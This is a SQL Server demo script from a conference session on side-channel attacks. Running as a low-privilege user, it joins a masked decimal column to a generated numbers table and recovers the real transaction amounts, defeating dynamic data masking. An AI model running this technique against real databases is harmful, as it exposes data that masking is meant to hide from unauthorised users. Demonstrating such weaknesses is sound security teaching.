/*******************************************************************
*	Session:	Side Channel Attacks in SQL Server
*	Author:		Ben Johnston
*	Name:		Demo03.Masking.03.Decimal.Complete.Unmasking.sql
*	Notes:		Example showing how decimal data can be unmasked by
*				matching directly to a numbers table.
*
*				This matches to decimals.
*				All rows could be matched by increasing the range
*				but the numbers table is kept small for demonstration
*				purposes.
********************************************************************/
USE WWISideChannel
SET NOCOUNT ON
GO

EXECUTE AS USER = 'SideChannelUser'
GO

;
WITH NUMBERS_CTE AS (
	SELECT 0 AS Number
		UNION ALL
	SELECT Number + 1
	FROM NUMBERS_CTE
	WHERE Number < 1000000
)
,DECIMAL_CTE AS (
	SELECT
		Number * .01 Number
	FROM NUMBERS_CTE
)

SELECT
	USER_NAME()		[USER_NAME()]
	,SupplierTransactionID
	,SupplierID
	,TransactionAmount
	,N.Number
FROM Purchasing.SupplierTransactions ST
	LEFT JOIN DECIMAL_CTE N
		ON ST.TransactionAmount		= N.Number
WHERE N.Number IS NOT NULL
ORDER BY SupplierTransactionID
OPTION (MAXRECURSION 0)
GO

REVERT
GO